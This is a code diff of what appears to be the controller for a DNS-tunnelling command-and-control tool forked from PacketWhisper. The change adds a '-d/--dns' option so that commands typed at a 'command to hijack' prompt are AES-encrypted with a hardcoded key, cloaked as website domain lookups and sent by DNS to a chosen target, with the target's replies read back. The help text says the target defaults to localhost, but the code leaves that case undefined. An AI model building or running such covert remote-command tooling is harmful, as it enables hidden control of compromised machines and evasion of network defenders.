@@ -1,7 +1,6 @@
 import subprocess
 import os
-import multiprocessing
-import dns_server
+import argparse
 from decloakify import Decloakify
 from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
@@ -12,7 +11,7 @@ from packetWhisper import CloakAndTransferFile, ExtractDNSQueriesFromPCAP, Extra
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
 
-def send_command(command):
+def send_command(command, dns):
     # Criptare il comando
     encrypted_command = encrypt_message(command, key) #debug
     #print("Encrypted command: "+encrypted_command)
@@ -23,7 +22,7 @@ def send_command(command):
     Cloakify(encrypted_command, cipher, cloaked_command)
 
     #print("Initializing command transfer")
-    TransferCloakedFile("cloaked_command.txt", 0.0, 'localhost')
+    TransferCloakedFile("cloaked_command.txt", 0.0, dns)
     # Verifica che il file `cloaked_command.txt` sia stato creato correttamente
     if not os.path.exists(cloaked_command):
         print("Errore: il file `cloaked_command.txt` non è stato creato.")
@@ -79,6 +78,10 @@ def receive_response():
 
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="Please make sure receiver is running on target ip (-d) \r\n\nNote: if unspecified default DNS (target ip) is considered to be 'localhost'",
+        formatter_class=argparse.RawTextHelpFormatter 
+    )
     ascii_art = """
             I@Y                  ~$o                   o$             
           "o@@@@Bf^          ,x$@@@@@@#)`          IC@@@@@m           
@@ -122,16 +125,22 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
     ~ Loris Simonetti a.k.a HeroS3c
     Forked from: PacketWhisper                             
 
-    see -h for help
-
     """
     
     print(ascii_art)
+
+    parser.add_argument(
+        '-d','--dns',
+        type=str,
+    )
+    args = parser.parse_args()
     print("Type a command to hijack below:")
     subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     while True:
+        if args.dns:
+            dns = args.dns
         command = input("> ")
-        send_command(command)
+        send_command(command, dns)
         try:
             receive_response() 
         except Exception as e:
